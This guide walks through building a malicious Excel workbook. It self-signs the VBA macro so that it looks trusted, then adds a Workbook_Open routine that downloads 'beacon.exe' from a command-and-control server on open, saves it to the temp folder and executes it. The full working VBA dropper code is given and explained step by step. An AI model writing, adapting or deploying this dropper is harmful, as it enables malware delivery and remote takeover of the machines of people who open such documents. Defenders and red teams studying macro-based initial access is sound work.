# Step 1: Digitally Sign a VBA Macro (Optional)

1. Create a Self-Signed Certificate
	If you don't already have a digital certificate, you can create a self-signed certificate using the Office tool SelfCert.exe.

	- Locate SelfCert.exe:
		For Office 2016 and later, you can find it in `C:\Program Files (x86)\Microsoft Office\root\OfficeXX (where XX is the version number, e.g., Office16)`
	
	- Run SelfCert.exe:
		Double-click `SelfCert.exe`
		Enter a name for your certificate (e.g., "My VBA Certificate").
		Click "OK".

		This creates a self-signed certificate that you can use to sign your macros.

2. Open the VBA Editor
	Open the Office application (Excel, Word, etc.) containing the macro.
	Press Alt + F11 to open the VBA editor.

3. Open the Digital Signature Dialog
	In the VBA editor, go to the Tools menu.
	Select Digital Signature.

4. Choose a Certificate
	In the Digital Signature dialog box, click Choose.
	Select your certificate from the list (e.g., "My VBA Certificate").
	Click OK.

5. Save Your Project
	Save the VBA project (macro).
	Close the VBA editor.

6. Verify the Signature
	Close and reopen the Office document containing the macro.
	When you open the document, the macro should now show as signed. You can check this by going back to the Tools > Digital Signature menu in the VBA editor.

#### Notes on Security

- Self-Signed Certificates: These are good for testing purposes but not for production use. In a production environment, obtain a certificate from a trusted CA.

- Certificate Authorities: Using a certificate from a trusted CA ensures that your macros are trusted by others and that the integrity of your code is maintained.

- Digital signatures ensure that the code has not been altered and confirm the identity of the author.

- Certificate Management: If using a self-signed certificate, you might need to install the certificate on the target machine's Trusted Root Certification Authorities store for it to be trusted.

# Step 2: Insert VBA Macro

How to Use

1. Open the VBA editor by pressing Alt + F11.

2. In the VBA editor, locate ThisWorkbook under Microsoft Excel Objects.

3. Double-click ThisWorkbook to open its code window.

4. Copy and paste the script into the ThisWorkbook code window.

5. Save and close the VBA editor.

6. Save your Excel workbook.

7. Close and reopen the workbook to trigger the Workbook_Open event, which will download the beacon and execute it.

# Step 3: VBA Scripts

```
Private Sub Workbook_Open()
	Dim fileURL As String
	Dim filePath As String

	' URL of the beacon to download from your C2 server
	fileURL = "[http://your-c2-server.com/path/to/beacon.exe](http://your-c2-server.com/path/to/beacon.exe)" ' Replace with your C2 server URL

	' Path to save the downloaded beacon in the temp directory
	filePath = Environ("TEMP") & "\beacon.exe"

	' Download the beacon
	If DownloadFile(fileURL, filePath) Then
		MsgBox "Beacon downloaded successfully!"
		
		' Execute the downloaded beacon
		Call Shell(filePath, vbNormalFocus)
	Else
		MsgBox "Beacon download failed!"
		Exit Sub
	End If
End Sub

Function DownloadFile(fileURL As String, filePath As String) As Boolean
	Dim HTTP As Object
	Dim adoStream As Object
	On Error GoTo errHandler

	' Create XMLHTTP object
	Set HTTP = CreateObject("MSXML2.XMLHTTP")
	' Open the HTTP request
	HTTP.Open "GET", fileURL, False
	' Send the HTTP request
	HTTP.Send

	' Create ADODB Stream object
	Set adoStream = CreateObject("ADODB.Stream")
	adoStream.Open
	adoStream.Type = 1 ' Binary
	' Write the HTTP response to the stream
	adoStream.Write HTTP.responseBody
	adoStream.Position = 0 ' Reset position to the start
	' Save the stream to a file
	adoStream.SaveToFile filePath, 2 ' Overwrite if file exists
	adoStream.Close

	DownloadFile = True
	Exit Function

errHandler:
	DownloadFile = False
End Function
```

#### Explanation

1. Workbook_Open Event:

```
Private Sub Workbook_Open()
	' Define file URL and path
	' Download the file
	' Execute the downloaded file
End Sub
```

This event triggers automatically when the workbook is opened. It defines the file URL and path, downloads the file, and then executes it.

2. DownloadFile Function:

```
Function DownloadFile(fileURL As String, filePath As String) As Boolean
	' Create and use XMLHTTP and ADODB.Stream to download and save the file
End Function
```

This function handles downloading the file from the specified URL and saving it to the specified file path.

3. Shell Function:

```
Call Shell(filePath, vbNormalFocus)
```

This line executes the downloaded file. vbNormalFocus ensures that the executed file runs with normal focus.